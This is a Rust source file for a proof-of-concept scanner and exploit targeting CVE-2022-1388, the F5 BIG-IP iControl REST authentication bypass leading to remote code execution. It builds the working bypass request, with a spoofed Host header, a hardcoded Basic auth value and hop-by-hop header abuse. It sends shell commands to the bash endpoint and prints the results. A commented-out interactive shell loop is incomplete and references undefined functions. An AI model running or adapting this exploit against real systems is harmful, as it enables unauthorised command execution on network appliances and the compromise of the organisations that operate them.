// Copyright (c) 2022 Petruknisme
// 
// This software is released under the MIT License.
// https://opensource.org/licenses/MIT

extern crate clap;
extern crate colored;
extern crate reqwest;

use clap::Parser;
use colored::Colorize;
use std::io::Write;
use reqwest::Response;
use serde_json::json;
use std::thread;


#[derive(Parser)]
#[clap(name = "CVE-2022-1388 PoC")]
#[clap(author = "Petruknisme <me@petruknisme.com>")]
#[clap(version = "1.0")]
#[clap(about = "Scanner and Interactive shell for CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE written in Rust", long_about = None)]


struct Cli {
    /// F5 Big-IP target url
    #[clap(short, long)]
    url: String,

    /// This mode for accessing payload with interactive shell
    #[clap(short, long)]
    shell: bool,
    
}

fn prompt(name:&str) -> String {
    let mut line = String::new();
    print!("{}", name);
    std::io::stdout().flush().unwrap();
    std::io::stdin().read_line(&mut line).expect("Error: Could not read a line");
 
    return line.trim().to_string()
}

#[tokio::main]
async fn get_header_only(url: &str, cmd: &str) -> Result<reqwest::Response, reqwest::Error>{

    let command_data = json!({
        "command": "run",
        "utilCmdArgs": format!("-c {}", &cmd),
        });
    
    let client = reqwest::Client::new();
    let res = client
            .post(url)
            .header("Host", "127.0.0.1")
            .header("Authorization", "Basic YWRtaW46aG9yaXpvbjM=")
            .header("X-F5-Auth-Token", "aToZ")
            .header("Connection", "X-F5-Auth-Token")
            .json(&command_data)
            .send()
            .await;
    return res;
}

#[tokio::main]
async fn get_json(url: &str, cmd: &str) -> String{

    let command_data = json!({
        "command": "run",
        "utilCmdArgs": format!("-c {}", &cmd),
        });
    
    let client = reqwest::Client::new();
    let res = client
            .post(url)
            .header("Host", "127.0.0.1")
            .header("Authorization", "Basic YWRtaW46aG9yaXpvbjM=")
            .header("X-F5-Auth-Token", "aToZ")
            .header("Connection", "X-F5-Auth-Token")
            .json(&command_data)
            .send()
            .await
            .unwrap();
    return res.json().await.unwrap();
}



fn main() {
    let cli = Cli::parse();
    let url = format!("{}/mgmt/tm/util/bash", cli.url);
    let shell = cli.shell;
    
    println!("{}", "\t\tScanner and Interactive shell for CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE written in Rust\n".yellow());
    println!("{} {}",
            "[*] Target:  ".blue(),
            url.red() 
    );

    println!("{}", "Checking if target is vulnerable...");
    
    let header = get_header_only(&url, "id");
    let s_code = header.unwrap().status();

  if s_code.as_str() == "401" {
        println!("{}", "401 Client Error: F5 Authorization Required");
        println!("{}", "Target not vulnerable!");
    }
    else if s_code.as_str() == "404" {
        println!("{}", "404 Page Not Found");
    }
    else if s_code.as_str() == "200" {
        println!("Target is Accessible. Trying to exploit");
        let respon = get_json(&url, "id && echo `whoami`@`hostname`");
        /* println!("{}", "Please input the command to run");
        loop {
            let input=prompt("> ");
            if input=="exit" { 
                break; 
            };
            let exploit_url = format!("{}", &url, input);
            let resp = send_json(&exploit_url);
            let rs: Vec<String> = resp.split("\n\u{0}").map(|s| s.to_string()).collect();
            println!("{}", unescape(&rs[0]).unwrap());
        } */

    } 

}